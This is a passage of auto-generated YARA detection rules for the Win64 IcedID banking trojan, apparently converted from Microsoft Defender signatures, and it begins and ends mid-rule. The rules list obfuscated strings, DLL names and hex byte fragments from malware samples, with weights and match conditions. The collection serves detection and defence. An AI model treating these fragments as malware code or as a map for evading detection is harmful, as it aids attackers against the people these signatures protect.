        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CEocgGxfZMLDfRlUJ" ascii //weight: 1
        $x_1_2 = "ELQaHlPUJFbLkJF" ascii //weight: 1
        $x_1_3 = "NhtNzgqbdXTlmozoK" ascii //weight: 1
        $x_2_4 = "PluginInit" ascii //weight: 2
        $x_1_5 = "nZDclmUxySbFDZkpdjAV" ascii //weight: 1
        $x_1_6 = "teUhTEqZnwlLSMVRTw" ascii //weight: 1
        $x_2_7 = "2a09e6f7dc959d3bd43644eaa96457cb83912025e53d48eadcf5b839aea6c065adfc806ff63d" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CD9AqKC3In" ascii //weight: 1
        $x_1_2 = "CPNpeI" ascii //weight: 1
        $x_1_3 = "HPDNH6hk0DO" ascii //weight: 1
        $x_1_4 = "Lkk8ZVby" ascii //weight: 1
        $x_1_5 = "N9yKytVUYCD" ascii //weight: 1
        $x_1_6 = "OzuPjI8qCu" ascii //weight: 1
        $x_1_7 = "Ro4nym" ascii //weight: 1
        $x_1_8 = "Vy561wE" ascii //weight: 1
        $x_1_9 = "XD0gbh" ascii //weight: 1
        $x_1_10 = "bjl5LO" ascii //weight: 1
        $x_1_11 = "tst7Biq" ascii //weight: 1
        $x_1_12 = "wauhdhbsjakdjuhas" ascii //weight: 1
        $x_2_13 = "8242a93e6c6d92d78e76dc1bf3792f986f4e9a42321e7b98192551b5ffc3484f6299e4342d460137" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AG_2147827699_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AG!MSR"
        threat_id = "2147827699"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "OkpvVSfdkT" ascii //weight: 1
        $x_1_2 = "PluginInit" ascii //weight: 1
        $x_1_3 = "RBDNcdoL" ascii //weight: 1
        $x_1_4 = "RhYSMfclIay" ascii //weight: 1
        $x_1_5 = "TALBeO" ascii //weight: 1
        $x_1_6 = "XpNliiN" ascii //weight: 1
        $x_1_7 = "ZzflqNh" ascii //weight: 1
        $x_1_8 = "cmQHva" ascii //weight: 1
        $x_1_9 = "iWIPvAMm" ascii //weight: 1
        $x_1_10 = "jmMTzhhZeIh" ascii //weight: 1
        $x_1_11 = "mkUpubcoegN" ascii //weight: 1
        $x_1_12 = "nQjZFEIVugP" ascii //weight: 1
        $x_1_13 = "nXkdyQbg" ascii //weight: 1
        $x_1_14 = "oOCQLtJoMIM" ascii //weight: 1
        $x_1_15 = "tXBOcTzQ" ascii //weight: 1
        $x_1_16 = "zMVPpVCazLo" ascii //weight: 1
        $x_2_17 = "a1454cd800882b702741d22d0d7100995724374eac4fcae63e46b06e871c5253be27e490ce2b8d" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DT_2147827737_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DT!MTB"
        threat_id = "2147827737"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "Dfgjkgsdfdghjfsa" ascii //weight: 10
        $x_1_2 = "IFHKWwYtPrC" ascii //weight: 1
        $x_1_3 = "QzthNmnwmqF" ascii //weight: 1
        $x_1_4 = "VtGArUBsFZ" ascii //weight: 1
        $x_1_5 = "MaFVZyhkKO" ascii //weight: 1
        $x_10_6 = "Ghbasfjknbyhjajkas" ascii //weight: 10
        $x_1_7 = "AIaNYUFfUoP" ascii //weight: 1
        $x_1_8 = "NEHVcBIkeIV" ascii //weight: 1
        $x_1_9 = "UfKzAPmSDtz" ascii //weight: 1
        $x_1_10 = "bpqKCGRhxg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_ET_2147827848_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ET!MTB"
        threat_id = "2147827848"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {49 c7 c4 9c 07 00 00 48 93 48 13 ec 48 81 ee 4b 19 00 00 c8 0e 00 00 cd a0 c3 88 4c 24 08 48 83 ec 18 e9 fd 00 00 00 48 83 c4 18 c3 e6 71}  //weight: 4, accuracy: High
        $x_1_2 = "Dfgjkgsdfdghjfsa" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BA_2147827849_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BA!MSR"
        threat_id = "2147827849"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "DJBvQe0Pa" ascii //weight: 2
        $x_2_2 = "IAVfTMjOv" ascii //weight: 2
        $x_2_3 = "IXZSLBZat0" ascii //weight: 2
        $x_2_4 = "JgloKDzge" ascii //weight: 2
        $x_2_5 = "JxrtkITomp" ascii //weight: 2
        $x_2_6 = "Pu2ZEbHTuf" ascii //weight: 2
        $x_2_7 = "Ur204zJA2" ascii //weight: 2
        $x_2_8 = "Yxn9Kh" ascii //weight: 2
        $x_2_9 = "guqUidQC" ascii //weight: 2
        $x_2_10 = "gyuashfhyugas" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DU_2147827904_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DU!MTB"
        threat_id = "2147827904"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ytawudijsauhydjas" ascii //weight: 10
        $x_1_2 = "fEJ6WRVbZhk" ascii //weight: 1
        $x_1_3 = "SYfcufM89j" ascii //weight: 1
        $x_1_4 = "Z6dP7G6" ascii //weight: 1
        $x_1_5 = "vmThvI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EW_2147827949_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EW!MTB"
        threat_id = "2147827949"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {4d 03 d3 4c 13 eb 48 81 ee e3 1b 00 00 49 f7 d1 48 33 f6 4d 8b ea 8b 44 24 08 48 83 c4 18}  //weight: 4, accuracy: High
        $x_1_2 = "Beyugbashyughas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BB_2147827971_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BB!MSR"
        threat_id = "2147827971"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "BFsKVq" ascii //weight: 2
        $x_2_2 = "BgGEPS" ascii //weight: 2
        $x_2_3 = "FvhnrhEFV" ascii //weight: 2
        $x_2_4 = "Ghnjhbdagbhiasdlksa" ascii //weight: 2
        $x_2_5 = "NAnZKEv" ascii //weight: 2
        $x_2_6 = "OAWhhnRKAFJ" ascii //weight: 2
        $x_2_7 = "RQFOlA" ascii //weight: 2
        $x_2_8 = "VGgPzNohm" ascii //weight: 2
        $x_2_9 = "XcLijZZwb" ascii //weight: 2
        $x_2_10 = "aLZAYMZvQ" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DV_2147828055_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DV!MTB"
        threat_id = "2147828055"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "Guaybsdnjubxyahjsa" ascii //weight: 10
        $x_1_2 = "frGVyjmHszC" ascii //weight: 1
        $x_1_3 = "kgFVCRHkhH" ascii //weight: 1
        $x_1_4 = "CemUZEyIfmW" ascii //weight: 1
        $x_1_5 = "DtHviKpTv" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AD_2147828593_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AD!MTB"
        threat_id = "2147828593"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {01 83 e2 03 41 83 e0 03 42 8a 4c 85 e0 02 4c 95 e0 32 c1 42 8b 4c 85 e0 41 88 04 1b 83 e1 07 8b 44 95}  //weight: 1, accuracy: High
        $x_1_2 = {48 8d 45 d7 45 33 c0 48 89 44 24 30 4c 8d 4d 7f 48 8d 45 77 33 c9 48 89 44 24 28 48 8d 55 e7 48}  //weight: 1, accuracy: High
        $x_1_3 = "9|$hu" ascii //weight: 1
        $x_1_4 = "L$0Hk" ascii //weight: 1
        $x_1_5 = "D$ !MXE3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CM_2147828701_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CM!MTB"
        threat_id = "2147828701"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c7 84 24 e0 00 00 00 0c 00 00 00 3a db 74 45 83 84 24 d4 00 00 00 03 c7 84 24 d8 00 00 00 2e 00 00 00 66 3b c0 74 ba 83 84 24 e4 00 00 00 26 c7 84 24 e8 00 00 00 32 00 00 00 66 3b d2 74 00 83 84 24 e8 00 00 00 28 c7 84 24 ec 00 00 00 01 00 00 00 eb 17 83 84 24 e0 00 00 00 00 c7 84 24 e4 00 00 00 12 00 00 00 3a c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DEC_2147828824_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DEC!MTB"
        threat_id = "2147828824"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4b 8d 14 08 49 ff c0 8a 42 40 32 02 88 44 11 40 49 83 f8 20}  //weight: 1, accuracy: High
        $x_1_2 = {4b 8d 14 08 49 ff c0 8a 42 40 32 02 88 44 11 40}  //weight: 1, accuracy: High
        $x_1_3 = {42 8a 04 02 02 c2 48 ff c2 c0 c0 03 0f b6 c8 8b c1 83 e1 0f 48 c1 e8 04 42 0f be 04 18 66 42 89 04 53 42 0f be 0c 19 66 42 89 4c 53 02}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_DW_2147829062_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DW!MTB"
        threat_id = "2147829062"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "Ascl059janlT4I3" ascii //weight: 10
        $x_1_2 = "CMeBd0y4m5o" ascii //weight: 1
        $x_1_3 = "DJSW9PSyBqWNLZo" ascii //weight: 1
        $x_1_4 = "KJbcXzkTuXA8I" ascii //weight: 1
        $x_1_5 = "SyvKWQXG0Yyde" ascii //weight: 1
        $x_10_6 = "AfR5ZQpBOS5S" ascii //weight: 10
        $x_1_7 = "CoMO4ZtbQAiMex" ascii //weight: 1
        $x_1_8 = "EyzRi9JwmCVwCzM" ascii //weight: 1
        $x_1_9 = "Hghcgxashfgfsfgdf" ascii //weight: 1
        $x_1_10 = "JHevVQDhmsQmKH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DX_2147829063_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DX!MTB"
        threat_id = "2147829063"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "E1NDeNN4nfBQ2" ascii //weight: 10
        $x_1_2 = "Hghcgxashfgfsfgdf" ascii //weight: 1
        $x_1_3 = "INqv41KGmcf68" ascii //weight: 1
        $x_1_4 = "LRDyK9OVxs3yUw" ascii //weight: 1
        $x_1_5 = "MxfMRRmZfV" ascii //weight: 1
        $x_10_6 = "BHTe3LS3IyrMY" ascii //weight: 10
        $x_1_7 = "ESXolxl2Ao" ascii //weight: 1
        $x_1_8 = "Hgjhghxghgcxhccxs" ascii //weight: 1
        $x_1_9 = "PFa4KabcE0lW3j" ascii //weight: 1
        $x_1_10 = "cPlVqSdFruOYjAwh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MAP_2147829091_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAP!MTB"
        threat_id = "2147829091"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "4kj09e.dll" ascii //weight: 1
        $x_1_2 = "Hafbhjsafvhsadbysa" ascii //weight: 1
        $x_1_3 = "BD5qE6nxHDx" ascii //weight: 1
        $x_1_4 = "SpSNmZ9TeN" ascii //weight: 1
        $x_1_5 = "eWDQYxmGLqf" ascii //weight: 1
        $x_1_6 = "ekjvh3umqc8KP0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAP_2147829091_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAP!MTB"
        threat_id = "2147829091"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {81 84 24 84 01 00 00 f1 00 00 00 c7 84 24 88 01 00 00 53 01 00 00 66 3b c0 74 18 83 84 24 7c 01 00 00 1b c7 84 24 80 01 00 00 03 00 00 00 66 3b c0 74 46}  //weight: 1, accuracy: High
        $x_1_2 = {83 84 24 38 01 00 00 2a c7 84 24 3c 01 00 00 1d 01 00 00 3a ed 0f 84 21 ff ff ff 83 84 24 cc 00 00 00 03 c7 84 24 d0 00 00 00 0b 00 00 00 3a c9 0f 84 a1 00 00 00}  //weight: 1, accuracy: High
        $x_1_3 = {83 84 24 18 02 00 00 14 c7 84 24 1c 02 00 00 29 09 00 00 66 3b c9 74 15 83 84 24 20 02 00 00 3d c7 44 24 30 f3 00 00 00 66 3b ed 74 54}  //weight: 1, accuracy: High
        $x_1_4 = {83 84 24 a4 00 00 00 6a c7 84 24 a8 00 00 00 0d 01 00 00 3a c9 74 00 83 84 24 a8 00 00 00 4d c7 84 24 ac 00 00 00 a7 00 00 00 66 3b ff 74 34}  //weight: 1, accuracy: High
        $x_1_5 = "ysbahfbhaygusfhjaskfbh" ascii //weight: 1
        $x_1_6 = "ygagihsfgyukasjhgyjas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_A_2147829145_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.A!MTB"
        threat_id = "2147829145"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 8b 49 78 0f b6 54 24 70 88 14 01 48 8b 84 24 60 01 00 00 8b 40 48 ff c0 48 8b 8c 24 60 01 00 00 89 41 48}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_A_2147829145_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.A!MTB"
        threat_id = "2147829145"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "LhpX5SQD90Wx" ascii //weight: 2
        $x_2_2 = "UZYhYWfJ" ascii //weight: 2
        $x_2_3 = "VOaFsY8PN" ascii //weight: 2
        $x_2_4 = "fWiOQbFk7" ascii //weight: 2
        $x_2_5 = "lkC8xooqZvrtbQyJ" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_A_2147829145_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.A!MTB"
        threat_id = "2147829145"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Nqp33t.dll" ascii //weight: 1
        $x_1_2 = "Hayugfnasubyfhhjss" ascii //weight: 1
        $x_1_3 = "XKY9SiGtxQZMiO4" ascii //weight: 1
        $x_1_4 = "ci2jDIcZujN7k" ascii //weight: 1
        $x_1_5 = "hOBLFzlCOfXvV8Vf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EX_2147829176_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EX!MTB"
        threat_id = "2147829176"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0f b6 4c 0c 50 33 c1 3a ff}  //weight: 1, accuracy: High
        $x_1_2 = {48 63 44 24 2c 0f b6 44 04 50}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAQ_2147829201_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAQ!MTB"
        threat_id = "2147829201"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "amEI.dll" ascii //weight: 1
        $x_1_2 = "cfhdshfdgjhdgdfhx" ascii //weight: 1
        $x_1_3 = "OLMySoBHERHAY" ascii //weight: 1
        $x_1_4 = "VQgSAGkRTg" ascii //weight: 1
        $x_1_5 = "dgGEVMEyUQwA" ascii //weight: 1
        $x_1_6 = "iTbfCMaZDeVQc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DY_2147829248_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DY!MTB"
        threat_id = "2147829248"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ALtKg1GNGGmA2N" ascii //weight: 10
        $x_1_2 = "EH5EwLjCdQ1pxMYy" ascii //weight: 1
        $x_1_3 = "In3Txq6lVYsKrdj3Sf2" ascii //weight: 1
        $x_1_4 = "KL6i3FAPH83VcX" ascii //weight: 1
        $x_1_5 = "LRybE8M0GOYIEhMxPf6p9" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAR_2147829369_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAR!MTB"
        threat_id = "2147829369"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bVGt.dll" ascii //weight: 1
        $x_1_2 = "ADoDotlHSJZFmns" ascii //weight: 1
        $x_1_3 = "FsHaiKzvMTOENVp" ascii //weight: 1
        $x_1_4 = "HOvPzmep" ascii //weight: 1
        $x_1_5 = "QDKQFQVzyoWVOOTv" ascii //weight: 1
        $x_1_6 = "baOBNLYpSrVAvwh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DZ_2147829373_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DZ!MTB"
        threat_id = "2147829373"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "zuafsnhybasjfkasnhfk" ascii //weight: 10
        $x_10_2 = "zhbsafuyashfjkasnksa" ascii //weight: 10
        $x_1_3 = {f0 00 22 20 0b 02 ?? ?? 00 78 05 00 00 04}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_SH_2147829443_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SH!MTB"
        threat_id = "2147829443"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 5d 10 66 01 da c1 ca 03 89 55 10 30 10 40 c1 ca 08}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SH_2147829443_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SH!MTB"
        threat_id = "2147829443"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 8b 8c 24 ?? ?? ?? ?? eb ?? 33 c8 8b c1 eb}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b 94 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? f7 bc 24 ?? ?? ?? ?? 8b c2 eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAS_2147829601_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAS!MTB"
        threat_id = "2147829601"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "ntugjhshagsdmajh" ascii //weight: 10
        $x_1_2 = {f0 00 22 20 0b 02 ?? ?? 00 da 01 00 00 02}  //weight: 1, accuracy: Low
        $x_1_3 = "TbajzurqEh" ascii //weight: 1
        $x_1_4 = "nGxcpP1A2X" ascii //weight: 1
        $x_1_5 = "oKliRUNo29" ascii //weight: 1
        $x_1_6 = "oZif9bKobUl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AO_2147829614_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AO!MTB"
        threat_id = "2147829614"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "BEmbNOwW.dll" ascii //weight: 10
        $x_1_2 = "ntugjhshagsdmajh" ascii //weight: 1
        $x_1_3 = "AORPMg13hFb" ascii //weight: 1
        $x_1_4 = "GEZADWUAtGMadrGs" ascii //weight: 1
        $x_1_5 = "LhpX5SQD90Wx" ascii //weight: 1
        $x_1_6 = "VOaFsY8PN" ascii //weight: 1
        $x_1_7 = "lkC8xooqZvrtbQyJ" ascii //weight: 1
        $x_1_8 = "nDb1M8pTCj" ascii //weight: 1
        $x_1_9 = "sVtsgwJyB61xl0RO" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AP_2147829636_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AP!MTB"
        threat_id = "2147829636"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "mydqmBbv.dll" ascii //weight: 10
        $x_1_2 = "ntugjhshagsdmajh" ascii //weight: 1
        $x_1_3 = "GEZADWUAtGMadrGs" ascii //weight: 1
        $x_1_4 = "GzIJFunV" ascii //weight: 1
        $x_1_5 = "sjhgB4DxuHkxMVY" ascii //weight: 1
        $x_1_6 = "UZYhYWfJ" ascii //weight: 1
        $x_1_7 = "tb2qNaa5" ascii //weight: 1
        $x_1_8 = "fWiOQbFk7" ascii //weight: 1
        $x_1_9 = "lkC8xooqZvrtbQyJ" ascii //weight: 1
        $x_1_10 = "nDb1M8pTCj" ascii //weight: 1
        $x_1_11 = "vhy7vbucHd03wJ8" ascii //weight: 1
    condition:
        (filesize < 20MB) and
